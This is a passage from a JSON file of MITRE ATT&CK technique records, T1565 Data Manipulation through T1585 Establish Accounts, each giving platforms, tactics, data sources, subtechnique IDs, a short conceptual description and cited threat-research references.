        "description": "SophosLabs. (2020, May 21). Ragnar Locker ransomware deploys virtual machine to dodge security. Retrieved June 29, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931",
    "platform": "linux|macos|windows",
    "tid": "T1565",
    "technique": "Data Manipulation",
    "tactic": "impact",
    "datasources": "application-logs|file-monitoring|network-protocol-analysis|packet-capture",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1565.001",
      "T1565.002",
      "T1565.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may insert, delete, or manipulate data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.<!-- raw HTML omitted --><!-- raw HTML omitted -->The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
    "platform": "linux|macos|windows|saas|office-365",
    "tid": "T1566",
    "technique": "Phishing",
    "tactic": "initial-access",
    "datasources": "anti-virus|detonation-chamber|email-gateway|file-monitoring|mail-server|network-intrusion-detection-system|packet-capture|ssl-tls-inspection|web-proxy",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1566.001",
      "T1566.002",
      "T1566.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems or to gather credentials for use of <a href=\"https://attack.mitre.org/techniques/T1078\">Valid Accounts</a>. Phishing may also be conducted via third-party services, like social media platforms.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/98.html",
        "description": "none",
        "external_id": "CAPEC-98"
      }
    ]
  },
  {
    "id": "attack-pattern--40597f16-0963-4249-bf4c-ac93b7fb9807",
    "platform": "linux|macos|windows",
    "tid": "T1567",
    "technique": "Exfiltration Over Web Service",
    "tactic": "exfiltration",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network|ssl-tls-inspection",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1567.001",
      "T1567.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.<!-- raw HTML omitted --><!-- raw HTML omitted -->Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--7bd9c723-2f78-4309-82c5-47cad406572b",
    "platform": "linux|macos|windows",
    "tid": "T1568",
    "technique": "Dynamic Resolution",
    "tactic": "command-and-control",
    "datasources": "dns-records|ssl-tls-inspection|web-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1568.001",
      "T1568.002",
      "T1568.003"
    ],
    "count_subtechniques": 3,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware’s communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may use dynamic resolution for the purpose of <a href=\"https://attack.mitre.org/techniques/T1008\">Fallback Channels</a>. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)</p>\n",
    "technique_references": [
      {
        "source_name": "Talos CCleanup 2017",
        "url": "http://blog.talosintelligence.com/2017/09/avast-distributes-malware.html",
        "description": "Brumaghin, E. et al. (2017, September 18). CCleanup: A Vast Number of Machines at Risk. Retrieved March 9, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye POSHSPY April 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/03/dissecting_one_ofap.html",
        "description": "Dunwoody, M.. (2017, April 3). Dissecting One of APT29’s Fileless WMI and PowerShell Backdoors (POSHSPY). Retrieved April 5, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "ESET Sednit 2017 Activity",
        "url": "https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/",
        "description": "ESET. (2017, December 21). Sednit update: How Fancy Bear Spent the Year. Retrieved February 18, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Data Driven Security DGA",
        "url": "https://datadrivensecurity.info/blog/posts/2014/Oct/dga-part2/",
        "description": "Jacobs, J. (2014, October 2). Building a DGA Classifier: Part 2, Feature Engineering. Retrieved February 18, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d157f9d2-d09a-4efa-bb2a-64963f94e253",
    "platform": "windows|macos",
    "tid": "T1569",
    "technique": "System Services",
    "tactic": "execution",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-registry",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1569.001",
      "T1569.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services. Many services are set to run at boot, which can aid in achieving persistence (<a href=\"https://attack.mitre.org/techniques/T1543\">Create or Modify System Process</a>), but adversaries can also abuse services for one-time or temporary execution.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5",
    "platform": "linux|macos|windows",
    "tid": "T1570",
    "technique": "Lateral Tool Transfer",
    "tactic": "lateral-movement",
    "datasources": "file-monitoring|netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-command-line-parameters|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with <a href=\"https://attack.mitre.org/techniques/T1021/002\">SMB/Windows Admin Shares</a> or <a href=\"https://attack.mitre.org/techniques/T1021/001\">Remote Desktop Protocol</a>. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--b18eae87-b469-4e14-b454-b171b416bc18",
    "platform": "linux|macos|windows",
    "tid": "T1571",
    "technique": "Non-Standard Port",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.</p>\n",
    "technique_references": [
      {
        "source_name": "Symantec Elfin Mar 2019",
        "url": "https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage",
        "description": "Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Fortinet Agent Tesla April 2018",
        "url": "https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant.html",
        "description": "Zhang, X. (2018, April 05). Analysis of New Agent Tesla Spyware Variant. Retrieved November 5, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b",
    "platform": "linux|macos|windows",
    "tid": "T1572",
    "technique": "Protocol Tunneling",
    "tactic": "command-and-control",
    "datasources": "netflow-enclave-netflow|network-protocol-analysis|packet-capture|process-monitoring|process-use-of-network",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. <!-- raw HTML omitted --><!-- raw HTML omitted -->There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling) <!-- raw HTML omitted --><!-- raw HTML omitted --><a href=\"https://attack.mitre.org/techniques/T1572\">Protocol Tunneling</a> may also be abused by adversaries during <a href=\"https://attack.mitre.org/techniques/T1568\">Dynamic Resolution</a>. Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also leverage <a href=\"https://attack.mitre.org/techniques/T1572\">Protocol Tunneling</a> in conjunction with <a href=\"https://attack.mitre.org/techniques/T1090\">Proxy</a> and/or <a href=\"https://attack.mitre.org/techniques/T1001/003\">Protocol Impersonation</a> to further conceal C2 communications and infrastructure.</p>\n",
    "technique_references": [
      {
        "source_name": "SSH Tunneling",
        "url": "https://www.ssh.com/ssh/tunneling",
        "description": "SSH.COM. (n.d.). SSH tunnel. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "BleepingComp Godlua JUL19",
        "url": "https://www.bleepingcomputer.com/news/security/new-godlua-malware-evades-traffic-monitoring-via-dns-over-https/",
        "description": "Gatlan, S. (2019, July 3). New Godlua Malware Evades Traffic Monitoring via DNS over HTTPS. Retrieved March 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b8902400-e6c5-4ba2-95aa-2d35b442b118",
    "platform": "linux|macos|windows",
    "tid": "T1573",
    "technique": "Encrypted Channel",
    "tactic": "command-and-control",
    "datasources": "malware-reverse-engineering|netflow-enclave-netflow|packet-capture|process-monitoring|process-use-of-network|ssl-tls-inspection",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1573.001",
      "T1573.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.</p>\n",
    "technique_references": [
      {
        "source_name": "SANS Decrypting SSL",
        "url": "http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840",
        "description": "Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "SEI SSL Inspection Risks",
        "url": "https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html",
        "description": "Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "University of Birmingham C2",
        "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf",
        "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6",
    "platform": "linux|macos|windows",
    "tid": "T1574",
    "technique": "Hijack Execution Flow",
    "tactic": "persistence",
    "datasources": "dll-monitoring|environment-variable|file-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1574.001",
      "T1574.002",
      "T1574.004",
      "T1574.005",
      "T1574.006",
      "T1574.007",
      "T1574.008",
      "T1574.009",
      "T1574.010",
      "T1574.011",
      "T1574.012"
    ],
    "count_subtechniques": 11,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.</p>\n",
    "technique_references": [
      {
        "source_name": "Autoruns for Windows",
        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns",
        "description": "Mark Russinovich. (2019, June 28). Autoruns for Windows v13.96. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6",
    "platform": "linux|macos|windows",
    "tid": "T1574",
    "technique": "Hijack Execution Flow",
    "tactic": "privilege-escalation",
    "datasources": "dll-monitoring|environment-variable|file-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1574.001",
      "T1574.002",
      "T1574.004",
      "T1574.005",
      "T1574.006",
      "T1574.007",
      "T1574.008",
      "T1574.009",
      "T1574.010",
      "T1574.011",
      "T1574.012"
    ],
    "count_subtechniques": 11,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.</p>\n",
    "technique_references": [
      {
        "source_name": "Autoruns for Windows",
        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns",
        "description": "Mark Russinovich. (2019, June 28). Autoruns for Windows v13.96. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--aedfca76-3b30-4866-b2aa-0f1d7fd1e4b6",
    "platform": "linux|macos|windows",
    "tid": "T1574",
    "technique": "Hijack Execution Flow",
    "tactic": "defense-evasion",
    "datasources": "dll-monitoring|environment-variable|file-monitoring|loaded-dlls|process-command-line-parameters|process-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1574.001",
      "T1574.002",
      "T1574.004",
      "T1574.005",
      "T1574.006",
      "T1574.007",
      "T1574.008",
      "T1574.009",
      "T1574.010",
      "T1574.011",
      "T1574.012"
    ],
    "count_subtechniques": 11,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.<!-- raw HTML omitted --><!-- raw HTML omitted -->There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.</p>\n",
    "technique_references": [
      {
        "source_name": "Autoruns for Windows",
        "url": "https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns",
        "description": "Mark Russinovich. (2019, June 28). Autoruns for Windows v13.96. Retrieved March 13, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
    "platform": "aws|gcp|azure",
    "tid": "T1578",
    "technique": "Modify Cloud Compute Infrastructure",
    "tactic": "defense-evasion",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs|stackdriver-logs",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1578.001",
      "T1578.002",
      "T1578.003",
      "T1578.004"
    ],
    "count_subtechniques": 4,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may attempt to modify a cloud account’s compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.<!-- raw HTML omitted --><!-- raw HTML omitted -->Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant M-Trends 2020",
        "url": "https://content.fireeye.com/m-trends/rpt-m-trends-2020",
        "description": "Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--57a3d31a-d04f-4663-b2da-7df8ec3f8c9d",
    "platform": "aws|azure|gcp",
    "tid": "T1580",
    "technique": "Cloud Infrastructure Discovery",
    "tactic": "discovery",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|gcp-audit-logs|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>An adversary may attempt to discover resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.<!-- raw HTML omitted --><!-- raw HTML omitted -->Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a <!-- raw HTML omitted -->DescribeInstances<!-- raw HTML omitted --> API within the Amazon EC2 API that can return information about one or more instances within an account, as well as the <!-- raw HTML omitted -->ListBuckets<!-- raw HTML omitted --> API that returns a list of all buckets owned by the authenticated sender of the request.(Citation: Amazon Describe Instance)(Citation: Amazon Describe Instances API) Similarly, GCP’s Cloud SDK CLI provides the <!-- raw HTML omitted -->gcloud compute instances list<!-- raw HTML omitted --> command to list all Google Compute Engine instances in a project(Citation: Google Compute Instances), and Azure’s CLI command <!-- raw HTML omitted -->az vm list<!-- raw HTML omitted --> lists details of virtual machines.(Citation: Microsoft AZ CLI)<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may enumerate resources using a compromised user’s access keys to determine which are available to that user.(Citation: Expel IO Evil in AWS) The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.(Citation: Mandiant M-Trends 2020) Unlike in <a href=\"https://attack.mitre.org/techniques/T1526\">Cloud Service Discovery</a>, this technique focuses on the discovery of components of the provided services rather than the services themselves.</p>\n",
    "technique_references": [
      {
        "source_name": "Amazon Describe Instance",
        "url": "https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html",
        "description": "Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Amazon Describe Instances API",
        "url": "https://docs.aws.amazon.com/AWSEC2/latest/APIReference/API_DescribeInstances.html",
        "description": "Amazon. (n.d.). DescribeInstances. Retrieved May 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Google Compute Instances",
        "url": "https://cloud.google.com/sdk/gcloud/reference/compute/instances/list",
        "description": "Google. (n.d.). gcloud compute instances list. Retrieved May 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft AZ CLI",
        "url": "https://docs.microsoft.com/en-us/cli/azure/ad/user?view=azure-cli-latest",
        "description": "Microsoft. (n.d.). az ad user. Retrieved October 6, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Expel IO Evil in AWS",
        "url": "https://expel.io/blog/finding-evil-in-aws/",
        "description": "A. Randazzo, B. Manahan and S. Lipton. (2020, April 28). Finding Evil in AWS. Retrieved June 25, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Mandiant M-Trends 2020",
        "url": "https://content.fireeye.com/m-trends/rpt-m-trends-2020",
        "description": "Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2",
    "platform": "pre",
    "tid": "T1583",
    "technique": "Acquire Infrastructure",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1583.001",
      "T1583.002",
      "T1583.003",
      "T1583.004",
      "T1583.005",
      "T1583.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Additionally, botnets are available for rent or purchase.<!-- raw HTML omitted --><!-- raw HTML omitted -->Use of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.</p>\n",
    "technique_references": [
      {
        "source_name": "TrendmicroHideoutsLease",
        "url": "https://documents.trendmicro.com/assets/wp/wp-criminal-hideouts-for-lease.pdf",
        "description": "Max Goncharov. (2015, July 15). Criminal Hideouts for Lease: Bulletproof Hosting Services. Retrieved March 6, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7e3beebd-8bfe-4e7b-a892-e44ab06a75f9",
    "platform": "pre",
    "tid": "T1584",
    "technique": "Compromise Infrastructure",
    "tactic": "resource-development",
    "datasources": "none",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1584.001",
      "T1584.002",
      "T1584.003",
      "T1584.004",
      "T1584.005",
      "T1584.006"
    ],
    "count_subtechniques": 6,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may compromise third-party infrastructure that can be used during targeting. Infrastructure solutions include physical or cloud servers, domains, and third-party web services. Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it during other phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous machines to form a botnet they can leverage.<!-- raw HTML omitted --><!-- raw HTML omitted -->Use of compromised infrastructure allows an adversary to stage, launch, and execute an operation. Compromised infrastructure can help adversary operations blend in with traffic that is seen as normal, such as contact with high reputation or trusted sites. By using compromised infrastructure, adversaries may make it difficult to tie their actions back to them. Prior to targeting, adversaries may compromise the infrastructure of other adversaries.(Citation: NSA NCSC Turla OilRig)</p>\n",
    "technique_references": [
      {
        "source_name": "Mandiant APT1",
        "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf",
        "description": "Mandiant. (n.d.). APT1 Exposing One of China’s Cyber Espionage Units. Retrieved July 18, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "ICANNDomainNameHijacking",
        "url": "https://www.icann.org/groups/ssac/documents/sac-007-en",
        "description": "ICANN Security and Stability Advisory Committee. (2005, July 12). Domain Name Hijacking: Incidents, Threats, Risks and Remediation. Retrieved March 6, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Talos DNSpionage Nov 2018",
        "url": "https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html",
        "description": "Mercer, W., Rascagneres, P. (2018, November 27). DNSpionage Campaign Targets Middle East. Retrieved October 9, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye EPS Awakens Part 2",
        "url": "https://www.fireeye.com/blog/threat-research/2015/12/the-eps-awakens-part-two.html",
        "description": "Winters, R.. (2015, December 20). The EPS Awakens - Part 2. Retrieved January 22, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "NSA NCSC Turla OilRig",
        "url": "https://media.defense.gov/2019/Oct/18/2002197242/-1/-1/0/NSA_CSA_Turla_20191021%20ver%204%20-%20nsa.gov.pdf",
        "description": "NSA/NCSC. (2019, October 21). Cybersecurity Advisory: Turla Group Exploits Iranian APT To Expand Coverage Of Victims. Retrieved October 16, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cdfc5f0a-9bb9-4352-b896-553cfa2d8fd8",
    "platform": "pre",
    "tid": "T1585",
    "technique": "Establish Accounts",
    "tactic": "resource-development",
    "datasources": "social-media-monitoring",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1585.001",
      "T1585.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Before compromising a victim, adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)<!-- raw HTML omitted --><!-- raw HTML omitted -->For operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)<!-- raw HTML omitted --><!-- raw HTML omitted -->Establishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for <a href=\"https://attack.mitre.org/techniques/T1598\">Phishing for Information</a> or <a href=\"https://attack.mitre.org/techniques/T1566\">Phishing</a>.(Citation: Mandiant APT1)</p>\n",
    "technique_references": [
      {
        "source_name": "NEWSCASTER2014",
        "url": "https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation",
        "description": "Lennon, M. (2014, May 29). Iranian Hackers Targeted US Officials in Elaborate Social Media Attack Operation. Retrieved March 1, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "BlackHatRobinSage",
        "url": "http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf",
